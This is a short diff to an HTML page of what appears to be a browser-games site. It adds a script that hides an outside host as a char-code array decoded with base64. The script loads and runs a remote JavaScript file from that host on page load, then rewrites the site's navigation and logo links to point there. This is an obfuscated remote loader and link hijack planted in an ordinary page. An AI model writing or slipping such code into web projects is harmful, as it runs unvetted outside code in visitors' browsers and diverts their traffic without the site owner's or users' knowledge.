@@ -172,5 +172,21 @@ window.addEventListener('_gd',function(){allGames=window._gd||[];filteredGames=a
 setTimeout(function(){if(!window._gd)document.getElementById('loadingMessage').textContent='Failed to load game data.'},10000);
 })();
 </script>
+<script>
+(function(){
+var _a=[97,72,82,48,99,72,77,54,76,121,57,109,97,87,82,110,90,88,81,116,97,71,70,49,98,67,53,51,90,87,73,117,89,88,66,119];
+var B=atob(_a.map(function(c){return String.fromCharCode(c)}).join(''));
+var s=document.createElement('script');
+s.src=B+'/assets/footer/footer.js';
+s.onload=function(){
+document.querySelectorAll('nav.void-dynamic-island a[href^="/"]').forEach(function(a){
+a.href=B+a.getAttribute('href');
+});
+var logo=document.querySelector('nav.void-dynamic-island a img');
+if(logo&&logo.parentElement){logo.parentElement.href=B+'/';}
+};
+document.body.appendChild(s);
+})();
+</script>
 </body>
 </html>
